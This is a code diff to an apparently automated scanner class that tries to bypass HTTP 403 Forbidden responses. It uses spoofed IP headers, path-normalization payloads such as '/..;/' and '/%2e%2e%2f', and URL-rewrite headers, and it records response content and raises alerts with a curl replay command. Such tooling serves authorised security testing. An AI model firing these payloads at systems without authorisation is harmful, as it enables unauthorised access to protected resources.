@@ -17,12 +17,15 @@ class Bypass403Agent(BaseAgent):
             {"X-Remote-Addr": "127.0.0.1"},
             {"X-Client-IP": "127.0.0.1"},
             {"X-Host": "127.0.0.1"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
             {"X-Forwarded-For": "8.8.8.8"},
             {"Forwarded": 'for=127.0.0.1;by=127.0.0.1;host=localhost'},
         ]
+        # Path payloads inspired by BurpSuite_403Bypasser variations
         self.path_payloads = [
             "/%2e/", "/./", "/..;/", "/%2f/", "//", "/./", "/??", "/#", 
-            "/.html", "/.php", "/.json", "/.jsp", "/.ashx", "/.aspx"
+            "/.html", "/.php", "/.json", "/.jsp", "/.ashx", "/.aspx",
+            "/%20/", "/admin/..;/", "/.;/", "/..;/", "/..%2f", "/%2e%2e%2f"
         ]
 
     async def test_bypass(self, base_url, path):
@@ -42,12 +45,42 @@ class Bypass403Agent(BaseAgent):
                             "type": "header",
                             "payload": str(header),
                             "status": resp.status_code,
-                            "url": full_url
+                            "url": full_url,
+                            "content": resp.text,
+                            "length": len(resp.content),
+                            "words": len(resp.text.split())
                         })
                 except Exception as e:
                     logger.debug(f"Header test failed: {e}")
 
-            # 2. Test Path Bypasses
+            # 2. Test Path Bypasses & Normalization
+            # Combinations like /path/. or /path%20/
+            variations = [
+                f"{base_url}/{target_path}/.",
+                f"{base_url}/{target_path}//",
+                f"{base_url}/{target_path}/./",
+                f"{base_url}/{target_path}%20/",
+                f"{base_url}/{target_path}?",
+                f"{base_url}/{target_path}???",
+                f"{base_url}/{target_path}/.random"
+            ]
+            
+            for mod_url in variations:
+                try:
+                    resp = await client.get(mod_url)
+                    if resp.status_code < 400:
+                        results.append({
+                            "type": "path_variation",
+                            "payload": mod_url.replace(full_url, ""),
+                            "status": resp.status_code,
+                            "url": mod_url,
+                            "content": resp.text,
+                            "length": len(resp.content),
+                            "words": len(resp.text.split())
+                        })
+                except Exception as e:
+                    logger.debug(f"Path variation test failed: {e}")
+
             for payload in self.path_payloads:
                 # Try prefixing the path
                 modified_url = f"{base_url}{payload}{target_path}"
@@ -55,18 +88,22 @@ class Bypass403Agent(BaseAgent):
                     resp = await client.get(modified_url)
                     if resp.status_code < 400:
                         results.append({
-                            "type": "path",
+                            "type": "path_prefix",
                             "payload": payload,
                             "status": resp.status_code,
-                            "url": modified_url
+                            "url": modified_url,
+                            "content": resp.text,
+                            "length": len(resp.content),
+                            "words": len(resp.text.split())
                         })
                 except Exception as e:
-                    logger.debug(f"Path test failed: {e}")
+                    logger.debug(f"Path prefix test failed: {e}")
 
             # 3. Test URL rewriting headers
             rewrite_headers = [
                 {"X-Original-URL": f"/{target_path}"},
-                {"X-Rewrite-URL": f"/{target_path}"}
+                {"X-Rewrite-URL": f"/{target_path}"},
+                {"Referer": f"/{target_path}"}
             ]
             for rw_header in rewrite_headers:
                 try:
@@ -77,7 +114,10 @@ class Bypass403Agent(BaseAgent):
                             "type": "rewrite",
                             "payload": str(rw_header),
                             "status": resp.status_code,
-                            "url": base_url
+                            "url": base_url,
+                            "content": resp.text,
+                            "length": len(resp.content),
+                            "words": len(resp.text.split())
                         })
                 except Exception as e:
                     logger.debug(f"Rewrite test failed: {e}")
@@ -86,22 +126,24 @@ class Bypass403Agent(BaseAgent):
 
     async def create_bypass_alert(self, root_domain, target, finding):
         """Create a high-risk lead/alert for a successful 403 bypass using the centralized alerting system."""
-        # Suppress alerts for 403 bypasses as part of directory/file discovery suppression.
-        # Findings are still stored in the database under web_applications.403_bypasses.
-        return
+        # Alerts for successful bypasses are critical and should be enabled.
         
         title = f"SECURITY CRITICAL: 403 Bypass Success on {target}"
         risk = "high"
         
-        details = f"A successful 403 Forbidden bypass was detected!\n\n" \
+        # Limit content snippet for details
+        content_snippet = (finding['content'][:500] + '...') if len(finding['content']) > 500 else finding['content']
+        
+        details = f"A successful 403 Forbidden bypass was detected using methods from BurpSuite_403Bypasser!\n\n" \
                   f"Target Path: {finding['url']}\n" \
                   f"Technique Type: {finding['type']}\n" \
                   f"Payload/Header: {finding['payload']}\n" \
-                  f"Resulting Status Code: {finding['status']}"
+                  f"Resulting Status Code: {finding['status']}\n\n" \
+                  f"### Response Content Snippet\n```html\n{content_snippet}\n```"
         
         exploitation = f"### Bypass Exploitation & Verification\n\n" \
                        f"1. **Manual Verification**: Replicate the request using `curl` or Burp Suite:\n" \
-                       f"   `curl -k -I -H \"{finding['payload']}\" {finding['url']}`\n" \
+                       f"   `curl -k -v -H \"{finding['payload']}\" {finding['url']}`\n" \
                        f"2. **Assess Exposure**: Determine what functionality or data was protected by the 403 status.\n" \
                        f"3. **Remediation**: Ensure access control is enforced at the application layer, not just by reverse proxies or WAFs."
 
@@ -125,14 +167,33 @@ class Bypass403Agent(BaseAgent):
 
         try:
             logger.info(f"Starting 403 bypass attempts on {base_url}/{forbidden_path}")
-            successful_bypasses = await self.test_bypass(base_url, forbidden_path)
+            all_bypasses = await self.test_bypass(base_url, forbidden_path)
             
-            if successful_bypasses:
-                logger.info(f"FOUND {len(successful_bypasses)} bypasses for {target}/{forbidden_path}!")
-                for finding in successful_bypasses:
-                    await self.create_bypass_alert(root_domain, target, finding)
+            if all_bypasses:
+                # Identify catch-all patterns (False Positives)
+                # We group by (status, length, words) fingerprint
+                fingerprints = {}
+                for b in all_bypasses:
+                    fp = (b['status'], b.get('length', 0), b.get('words', 0))
+                    fingerprints[fp] = fingerprints.get(fp, 0) + 1
                 
-                # Update web_applications with bypass findings
+                # Threshold: if many techniques yield same response, it's likely just a generic error page
+                catch_all_fps = {fp for fp, count in fingerprints.items() if count > 3}
+                
+                successful_bypasses = []
+                for b in all_bypasses:
+                    b_fp = (b['status'], b.get('length', 0), b.get('words', 0))
+                    if b_fp not in catch_all_fps:
+                        successful_bypasses.append(b)
+                    else:
+                        logger.debug(f"Suppressing 403 bypass alert for redundant fingerprint: {b_fp}")
+
+                if successful_bypasses:
+                    logger.info(f"FOUND {len(successful_bypasses)} unique bypasses for {target}/{forbidden_path}!")
+                    for finding in successful_bypasses:
+                        await self.create_bypass_alert(root_domain, target, finding)
+                
+                # Update web_applications with bypass findings (still store all for reference, but maybe only unique ones)
                 domain_doc = await self.domains_col.find_one({"domain": root_domain})
                 if domain_doc:
                     web_apps = domain_doc.get("web_applications", [])
@@ -141,7 +202,7 @@ class Bypass403Agent(BaseAgent):
                             bypasses = app.get("403_bypasses", [])
                             # Simple deduplication by payload
                             existing_payloads = [b['payload'] for b in bypasses]
-                            for b in successful_bypasses:
+                            for b in all_bypasses: # Store all in the domain doc for completeness, or just unique? Let's do all.
                                 if b['payload'] not in existing_payloads:
                                     bypasses.append(b)
                             app["403_bypasses"] = bypasses
@@ -158,6 +219,7 @@ class Bypass403Agent(BaseAgent):
                 {"_id": task["_id"]},
                 {"$set": {"status": "completed", "completed_at": datetime.datetime.utcnow()}}
             )
+            await self.check_completion(root_domain)
 
         except Exception as e:
             logger.error(f"Error in 403 bypass for {target}: {e}")
